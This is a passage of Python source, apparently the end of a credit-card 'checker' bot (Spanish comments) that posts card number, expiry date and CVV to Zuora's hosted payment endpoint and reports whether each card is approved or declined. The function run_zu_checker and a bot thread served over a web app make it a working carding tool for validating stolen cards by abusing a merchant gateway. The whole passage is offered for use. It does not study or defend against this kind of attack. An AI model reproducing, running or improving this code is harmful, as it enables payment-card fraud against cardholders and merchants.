"field_deviceSessionId": "", "field_ipAddress": "", "field_useDefaultRetryRule": "", "field_paymentRetryWindow": "", "field_maxConsecutivePaymentFailures": "", "field_creditCardAddress1": address, "field_creditCardAddress2": address, "field_creditCardCity": city, "field_creditCardCountry": "USA", "field_creditCardState": "New York", "field_creditCardPostalCode": "10081", "field_creditCardNumber": "", "field_creditCardType": "Visa", "field_creditCardExpirationMonth": "", "field_creditCardExpirationYear": "", "field_cardSecurityCode": "", "field_creditCardHolderName": name1 + " " + name2, "encodedZuoraIframeInfo": "eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vd3d3Lnp1b3JhLmNvbS9hcHBzLyIsImZvcm1XaWR0aCI6NzE2LjMsImZvcm1IZWlnaHQiOjExMTQuNzcsImxheW91dFN0eWxlIjoiYnV0dG9uT3V0c2lkZSIsInp1b3JhSnNWZXJzaW9uIjoiIiwiZm9ybUZpZWxkcyI6W3siaWQiOiJmb3JtLWVsZW1lbnQtY3JlZGl0Q2FyZFR5cGUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmROdW1iZXIiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRFeHBpcmF0aW9uWWVhciIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEhvbGRlck5hbWUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRDb3VudHJ5IiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkU3RhdGUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRBZGRyZXNzMSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEFkZHJlc3MyIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQ2l0eSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZFBvc3RhbENvZGUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LXBob25lIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1lbWFpbCIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfV19"}
            try:
                req = web.post("https://api.zuora.com/apps/PublicHostedPageLite.do", headers=headers, data=data)
                if self._Capture(req.text, 'success":"', '"') == "true":
                    Message = "Approved"
                    Status = self._VerifyStatusResponse(Message)
                    return Message, Status
                Message = self._Capture(req.text, 'errorMessage":"', '"')
                if Message is None:
                    SiteError = "Error Post Checkout (Request 14)"
                    break
                Status = self._VerifyStatusResponse(Message)
                return Message, Status
            except Exception as u:
                SiteError = f"Error Post Checkout (Request 14) | {u}"
                break

        return SiteError, False

# ======================= FUNCIÓN PARA EJECUTAR EL CHECKER =======================
def run_zu_checker(cc, mm, yy, cvv):
    """Ejecuta el checker de Monster y retorna el resultado"""
    try:
        result = GatewaysDeveloper().Run(cc, mm, yy, cvv)
        return result
    except Exception as e:
        return {
            "status": False,
            "succes": False,
            "gateway-response": f"Error: {str(e)[:100]}",
            "gateway-type": "Zuora + Braintree"
        }

# ======================= INICIO =======================
if __name__ == "__main__":
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
else:
    threading.Thread(target=start_bot, daemon=True).start()